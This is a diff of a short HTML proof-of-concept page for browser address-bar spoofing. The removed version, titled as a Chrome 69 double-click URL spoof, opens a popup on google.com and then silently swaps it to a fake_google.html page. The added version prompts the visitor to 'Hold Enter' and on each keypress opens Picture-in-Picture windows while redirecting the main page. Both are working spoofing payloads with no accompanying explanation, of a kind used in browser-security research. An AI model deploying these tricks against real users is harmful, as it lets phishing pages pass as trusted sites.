@@ -1,18 +1,24 @@
- <html>
-    <head>
-        <title>Chrome 69 Double-click URL Spoof - evi1m0.bat[at]gmail.com</title>
-    </head>
-    <body>
-        <li>step1: click button</li>
-        <li>step2: double click the address bar of the new window</li>
-        <br>
-        <button onclick="pwn()">clickme</button>
+<h1>Hold Enter</h1>
 
-        <script>
-            var pwn = () => {
-                win = window.open("https://google.com", "test", "width=400 height=400");
-                setTimeout("win.location = './fake_google.html'", 4000);
-            }
-        </script>
-    </body>
-    </html>
+<script>
+    let i = 0;
+    const pipOpen = async () => {
+        if (i > 5) return;
+        i++;
+
+        documentPictureInPicture.requestWindow({
+            width: 600,
+            height: 400,
+        }).then(pipWindow => {
+            pipWindow.location.href = 'https://example.com';
+        });
+
+        setTimeout(() => {
+            location.href = 'https://google.com/x';
+        }, 100);
+    };
+
+    document.body.onkeypress = () => {
+        pipOpen();
+    };
+</script>
